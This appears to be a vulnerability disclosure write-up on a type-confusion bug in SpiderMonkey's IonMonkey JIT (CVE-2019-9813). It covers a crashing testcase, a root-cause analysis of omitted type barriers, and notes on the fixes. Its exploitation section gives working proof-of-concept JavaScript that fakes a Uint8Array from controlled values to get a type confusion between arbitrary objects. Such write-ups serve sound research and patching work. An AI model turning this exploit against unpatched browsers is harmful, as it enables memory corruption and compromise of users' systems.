@@ -1,0 +1,232 @@
+A bug in IonMonkey leaves type inference information inconsistent, which in turn allows the compilation of JITed functions that cause type confusions between arbitrary objects.
+
+# Prerequisites
+
+In Spidermonkey, every JavaScript objects is an instance of the JSObject class [1]. Plain JavaScript objects (e.g. ones created through an object literal) are typically instances of the NativeObject [2] class. A NativeObject is basically:
+
+* An ObjectGroup [3] which stores things like the prototype and type information for properties (see below)
+* The Shape [4] of the object which indicates the location of properties. A Shape could e.g. tell that property .p is stored in the 2nd property slot
+* Property storage [5]: a dynamically sized array in which the property values are stored. The Shapes provide indices into this array
+* Element storage [6]: a dynamically sized array in which elements (properties with an integer key) are stored
+
+Spidermonky makes use of type inference to perform various optimizations in the JIT. Specifically, type inference is used to predict the types of object properties and then omit runtime type checks for them. Such a type inference system for property values is only safe as long as every property store to an object validates that the type of the new value is consistent with the existing type information or, if not, updates ("widens") the inferred type. In Spidermonkey's interpreter this is done in e.g. AddOrChangeProperty [7]. In the JIT compiler (IonMonkey), this is done through "type barriers" [8]: small runtime type checks that ensure the written value is consistent with what is stored as inferred type and otherwise bail out from the JITed code.
+
+# Crashing Testcase
+
+The following program, found through fuzzing and then manually modified, crashes Spidermonkey with an assertion that verifies that type inference data is consistent with the actual values stored as properties:
+
+    function hax(o, changeProto) {
+        if (changeProto) {
+            o.p = 42;
+            o.__proto__ = {};
+        }
+        o.p = 13.37;
+        return o;
+    }
+
+    for (let i = 0; i < 1000; i++) {
+        hax({}, false);
+    }
+
+    for (let i = 0; i < 10000; i++) {
+        let o = hax({}, true);
+        eval('o.p'); 			// Crash here
+    }
+
+
+Crashes in debug builds of Spidermonkey with:
+
+    Assertion failure: [infer failure] Missing type in object [Object * 0x327f2ca0aca0] p: float, at js/src/vm/TypeInference.cpp:265
+    Hit MOZ_CRASH() at js/src/vm/TypeInference.cpp:266
+
+This assertion expresses that type inference data is inconsistent for the property .p as the type "float" is not in the list of possible types but the property currently holds a float value.
+
+# Bug Analysis
+
+In essence it appears that IonMonkey fails to realize that the ObjectGroup of the object `o` can change throughout the function (specifically during the prototype change) and thus incorrectly omits a type barrier for the second property assignment, leading to inconsistent type inference information after the property assignment.
+
+In detail, the following appears to be happening:
+
+The first loop runs and allocates NativeObjects with ObjectGroup OG1 and Shape S1. After some iterations the function hax is JIT compiled. At that point, the compiled code will expect to be called with an object of ObjectGroup OG1 as input. OG1 will have inferred types {.p: [float]} because the body of the if condition was never executed and so property .p was never set to a non-float value.
+
+Then the second loop starts running, which will allocate objects using a new ObjectGroup, OG2 (I'm not exactly sure why it's a new one here, most likely some kind of heuristic) but still using Shape S1. As such, the compiled code for hax will be invalidated [9]. Then, during the first invocation of hax with changeProto == true, a new prototype will be set for o, which will
+
+1. cause a new ObjectGroup to be allocated for O (because prototypes are stored in the object group) and
+2. cause the previous object group (OG2) to discard any inferred types and set the state of inferred properties to unknown [10]. An ObjectGroup with unknownProperties is then never again used for type inference of properties [11].
+
+At a later point in the loop, the function is recompiled, but this time it is compiled to expect an object of ObjectGroup OG1 or OG2 as input. The JIT compiled code for hax will now look something like this (pseudocode):
+
+    // Verify that the input is an object with ObjectGroup OG1 or OG2 (actually
+    // this check is performed before entering the JITed code)
+    VerifyInputTypes
+
+    if (changeProto) {
+        // A SetProperty [12] inline cache [13] which will perform the actual
+        // property store and speed up subsequent property stores on objects of
+        // the same Shape and Group. Since a type barrier is required, the Group
+        // is used as an additional index into the cache so that both Shape and
+        // Group must match, in which case no inferred types could be
+        // accidentially invalidated.
+        SetPropertyICWithTypeBarrier o.p 42
+
+        Call ChangePrototype(o, {})
+    }
+
+    // Another inline cache to store property .p again, but this time without a
+    // type barrier. As such, only the Shape will be checked and not the Group.
+    SetPropertyIC o.p 13.37
+
+    Return o
+
+After compilation finishes, the following happens in the first invocation of the JITed code:
+
+* The function is called with an object of ObjectGroup OG2 and Shape S1
+* The property .p is stored on the object in the first SetProperty cache. This does not update any inferred type as OG2 does not use inferred types
+* The prototype of o is changed
+    * This again causes a new ObjectGroup, OG3, to be allocated
+    * When creating the new group, property types are inferred from the current object (this is possible because it is the only object using the new group) [14]
+    * As such, o now has an ObjectGroup OG3 with inferred types {.p: [int]}
+* The second propertystore cache runs into a cache miss (because it is empty at this point)
+    * Execution transfers to the slow path (a runtime property store)
+    * This will store the property and update the inferred types of OG3 to {.p: [int, float]}
+    * It will then update the inline cache to now directly handle property stores to objects with shape S1
+    * Because this SetPropertyIC is not marked as requiring a type barrier, the cache only guards on the Shape, not the Group [15]
+
+Then, in the second invocation of the JITed code:
+
+* As above, a new ObjectGroup OG4 is allocated for o with inferred types {.p: [int]} when changing the prototype
+* The second SetPropertyIC now runs into a cache hit (because it only looks at the Shape which is still S1)
+* It then directly writes the property value into the property slot without updating inferred types
+
+As such, after the second invocation the returned object is one whose ObjectGroup (OG4) states that the property .p must be an integer but it really is a float. At this time, any validation of inferred types will crash with an assertion as happens during the runtime property lookup of .p in the call to eval().
+
+The core issue here is that the second property store was marked as not requiring a type barrier. To understand why, it is necessary to look into the logic determining whether a property write should be guarded with a type barrier, implemented in jit::PropertyWriteNeedsTypeBarrier [16]. The logic of that function is roughly:
+
+1. Iterate over the set of possible object types, in this case that is OG1 and OG2
+2. For every group, check whether storing a value of type T (in this case float) would violate inferred property types
+	- In this case, OG1 already has the correct type for property .p, so no violation there
+	- And OG2 does not even track property types, so again no violation [17]
+3. If no violations were found, no type barrier is needed
+
+The problem is that PropertyWriteNeedsTypeBarrier operates on the possible ObjectGroups of the input object at the beginning of the function which are not necessarily the same as at the time the property store is performed. As such, it fails to realize that the input object can actually have an ObjectGroup (in this case OG4) that has inferred property types that would be violated by the property write. It then falsely determine that a type barrier is not needed, leading to the scenario described above.
+
+# Exploitation
+
+Exploitation of this type of vulnerability comes down to JIT compiling a function in such a way that the compiler makes use of type inference data to omit runtime type checks. Afterwards a type confusion between arbitrary objects can be achieved.
+
+The following code demonstrates this by setting the inferred type to Uint8Array but actually storing an object with controlled property values (overlapping with internal fields of a Uint8Array) in the property. It then compiles code (the function pwn) to omit type checks on the property value based on its inferred types, thus treating the custom object as a Uint8Array and crashing when reading from 0x414141414141:
+
+    let ab = new ArrayBuffer(1024);
+
+    function hax(o, changeProto) {
+        // The argument type for |o| will be object of group OG1 or OG2. OG1 will
+        // have the inferred types {.p: [Y]}. OG2 on the other hand will be an
+        // ObjectGroup with unknown property types due to the prototype change. As
+        // such, OG2 will never have any inferred property types.
+
+        // Ultimately, this code will confuse types X and Y with each other.
+        // Type X: a Uint8Array
+        let x = new Uint8Array(1024);
+        // Type Y: a unboxed object looking a bit like a Uint8Array but with controlled data... :)
+        let y = {slots: 13.37, elements: 13.38, buffer: ab, length: 13.39, byteOffset: 13.40, data: 3.54484805889626e-310};
+
+        if (changeProto) {
+            o.p = x;
+
+            // This prototype change will cause a new ObjectGroup, OG_N, to be
+            // allocated for o every time it is executed (because the prototype is
+            // stored in the ObjectGroup). During creation of the new ObjectGroup,
+            // the current property values will be used to infer property types. As
+            // such, OG_N will have the inferred types {.p: [X]}.
+            o.__proto__ = {};
+        }
+
+        // This property write was not marked as requiring type barriers to
+        // validate the consistency of inferred property types. The reason is that
+        // for OG1, the property type is already correct and OG2 does not track
+        // property types at all. However, IonMonkey failed to realize that the
+        // ObjectGroup of o could have changed in between to a new ObjectGroup that
+        // has different inferred property types. As such, the type barrier
+        // omission here is unsafe.
+        //
+        // In the second invocation, the inline cache for this property store will
+        // then be a hit (because the IC only uses the Shape to index the cache,
+        // not the Group). As such, the inferred types associated with the
+        // ObjectGroup for o will not be updated and will be left inconsistent.
+        o.p = y;
+
+        return o;
+    }
+
+    function pwn(o, trigger) {
+        if (trigger) {
+            // Is on a code path that wasn't executed in the interpreter so that
+            // IonMonkey solely relies on type inference instead of type profiles
+            // from the interpreter (which would show the real type).
+            return o.p[0];
+        } else {
+            return 42;
+        }
+    }
+
+    // "Teach" the function hax that it should accept objects with ObjectGroup OG1.
+    // This is required as IonMonkey needs to have at least one "known" type when
+    // determining whether it can omit type barriers for property writes:
+    // https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/jit/MIR.cpp#L6282
+    for (let i = 0; i < 10000; i++) {
+        hax({}, false);
+    }
+
+    // Compile hax to trigger the bug in such a way that an object will be created
+    // whose ObjectGroup indicates type X for property .p but whose real type will
+    // be Y, where both X and Y can be arbitrarily chosen.
+    let evilObj;
+    for (let i = 0; i < 10000; i++) {
+        evilObj = hax({}, true);
+
+        // Not sure why this is required here, it maybe prevents JITing of the main
+        // script or similar...
+        eval('evilObj.p');
+    }
+
+    // JIT compile the second function and make it rely on the (incorrect) type
+    // inference data to omit runtime type checks.
+    for (let i = 0; i < 100000; i++) {
+        pwn(evilObj, false);
+    }
+
+    // Finally trigger a type confusion.
+    pwn(evilObj, true);
+
+Note, this way of exploiting the issue requires UnboxedObjects [18] which have recently been disabled by default [19]. However, the bug itself does not require UnboxedObjects and can be exploited in other ways. UnboxedObjects are just the most (?) convenient way.
+
+[1] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/vm/JSObject.h#L54
+[2] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/vm/NativeObject.h#L463
+[3] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/vm/ObjectGroup.h#L87
+[4] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/vm/Shape.h#L37
+[5] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/vm/NativeObject.h#L466
+[6] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/vm/NativeObject.h#L469
+[7] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/vm/NativeObject.cpp#L1448
+[8] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/jit/MIR.h#L10254
+[9] https://blog.mozilla.org/javascript/2012/10/15/the-ins-and-outs-of-invalidation/
+[10] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/vm/JSObject.cpp#L2219
+[11] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/vm/TypeInference.cpp#L2946
+[12] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/jit/IonIC.h#L280
+[13] https://www.mgaudet.ca/technical/2018/6/5/an-inline-cache-isnt-just-a-cache
+[14] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/vm/NativeObject.cpp#L1259
+[15] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/jit/CacheIR.cpp#L3544
+[16] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/jit/MIR.cpp#L6268
+[17] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/jit/MIR.cpp#L6293
+[18] https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/vm/UnboxedObject.h#L187
+[19] https://github.com/mozilla/gecko-dev/commit/26965039e60a00b3600ce2e6a559106e4a3a30ca
+
+ Bugzilla entry: https://bugzilla.mozilla.org/show_bug.cgi?id=1538120
+
+
+ Fixed in https://www.mozilla.org/en-US/security/advisories/mfsa2019-09/#CVE-2019-9813 (bug collision with a pwn2own entry)
+
+The issue was fixed in two ways:
+
+1. in https://github.com/mozilla/gecko-dev/commit/0ff528029590e051baa60265b3af92a632a7e850 the code that adds inferred properties after a prototype change (step `* When creating the new group, property types are inferred from the current object` above) was changed to no longer create inferred property types when coming from Groups marked as having unknownProperties. As such, in this case the new ObjectGroups created from OG2 would now all have unknownProperties as well.
+
+2. in https://github.com/mozilla/gecko-dev/commit/f8ce40d176067800e5dda013fb4d8ff9e91d9a88 the function responsible for determining whether write barriers can be omitted (jit::PropertyWriteNeedsTypeBarrier) was modified to always emit write barriers if one of the input groups has unknownProperties.
